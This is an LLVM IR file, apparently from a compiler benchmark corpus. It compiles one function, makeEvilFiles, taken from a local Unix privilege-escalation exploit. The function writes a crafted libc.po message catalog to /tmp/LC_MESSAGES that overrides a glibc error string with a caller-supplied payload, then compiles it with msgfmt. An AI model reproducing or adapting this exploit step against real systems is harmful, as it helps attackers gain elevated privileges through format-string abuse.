; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20189.c_makeEvilFiles.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_20189.c_makeEvilFiles.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"/tmp/LC_MESSAGES\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"mkdir()\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"chdir()\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"/tmp/LC_MESSAGES/libc.po\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"w\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"fopen()\00", align 1
@.str.6 = private unnamed_addr constant [38 x i8] c"msgid \22%%s: invalid option -- %%c\\n\22\0A\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"msgstr \22%s\\n\22\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"/usr/bin/msgfmt\00", align 1
@stderr = common dso_local global i32* null, align 8
@.str.9 = private unnamed_addr constant [37 x i8] c"Error: /usr/bin/msgfmt not found...\0A\00", align 1
@.str.10 = private unnamed_addr constant [35 x i8] c"/usr/bin/msgfmt libc.po -o libc.mo\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @makeEvilFiles(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32*, align 8
  store i8* %0, i8** %2, align 8
  %4 = call i64 @mkdir(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i32 448)
  %5 = icmp ne i64 %4, 0
  br i1 %5, label %6, label %9

6:                                                ; preds = %1
  %7 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %8 = call i32 @exit(i32 -1) #3
  unreachable

9:                                                ; preds = %1
  %10 = call i64 @chdir(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0))
  %11 = icmp ne i64 %10, 0
  br i1 %11, label %12, label %15

12:                                               ; preds = %9
  %13 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %14 = call i32 @exit(i32 -1) #3
  unreachable

15:                                               ; preds = %9
  %16 = call i32* @fopen(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %16, i32** %3, align 8
  %17 = icmp ne i32* %16, null
  br i1 %17, label %21, label %18

18:                                               ; preds = %15
  %19 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %20 = call i32 @exit(i32 -1) #3
  unreachable

21:                                               ; preds = %15
  %22 = load i32*, i32** %3, align 8
  %23 = call i32 (i32*, i8*, ...) @fprintf(i32* %22, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.6, i64 0, i64 0))
  %24 = load i32*, i32** %3, align 8
  %25 = load i8*, i8** %2, align 8
  %26 = call i32 (i32*, i8*, ...) @fprintf(i32* %24, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i8* %25)
  %27 = load i32*, i32** %3, align 8
  %28 = call i32 @fflush(i32* %27)
  %29 = load i32*, i32** %3, align 8
  %30 = call i32 @fclose(i32* %29)
  %31 = call i32 @fileExists(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.8, i64 0, i64 0))
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %37, label %33

33:                                               ; preds = %21
  %34 = load i32*, i32** @stderr, align 8
  %35 = call i32 (i32*, i8*, ...) @fprintf(i32* %34, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0))
  %36 = call i32 @exit(i32 -1) #3
  unreachable

37:                                               ; preds = %21
  %38 = call i32 @system(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0))
  ret void
}

declare dso_local i64 @mkdir(i8*, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @chdir(i8*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @fflush(i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @fileExists(i8*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
